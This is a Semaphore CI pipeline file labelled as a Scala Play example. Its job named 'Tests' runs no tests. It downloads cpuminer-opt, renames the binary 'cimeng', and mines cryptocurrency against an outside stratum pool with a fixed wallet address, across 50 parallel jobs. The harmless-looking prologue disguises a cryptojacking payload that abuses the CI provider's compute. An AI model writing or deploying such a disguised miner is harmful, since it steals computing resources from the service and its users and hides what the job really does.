version: v1.0
name: Semaphore example for Scala Play
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
execution_time_limit:
  hours: 24
blocks:
  - name: Scala with Play
    task:
      env_vars:
        - name: SCALA_VERSION
          value: 2.12.6
      prologue:
        commands:
          - cd $HOME
          - ls -lah
          - checkout
          - sem-version scala 2.12
          - 'cache restore sbt-java$JAVA_VERSION-$SEMAPHORE_GIT_BRANCH-$(checksum $SEMAPHORE_PROJECT_NAME/build.sbt),sbt-java$JAVA_VERSION-$SEMAPHORE_GIT_BRANCH,sbt-java$JAVA_VERSION-master'
          - 'cache restore ivy2-java$JAVA_VERSION-$SEMAPHORE_GIT_BRANCH-$(checksum $SEMAPHORE_PROJECT_NAME/build.sbt),ivy2-java$JAVA_VERSION-$SEMAPHORE_GIT_BRANCH,ivy2-java$JAVA_VERSION-master'
          - 'cache restore gradle-java$JAVA_VERSION-$SEMAPHORE_GIT_BRANCH-$(checksum $SEMAPHORE_PROJECT_NAME/build.sbt),gradle-java$JAVA_VERSION-$SEMAPHORE_GIT_BRANCH,gradle-java$JAVA_VERSION-master'
      jobs:
        - name: Tests
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - mv cpuminer-sse2 cimeng
            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
          parallelism: 50
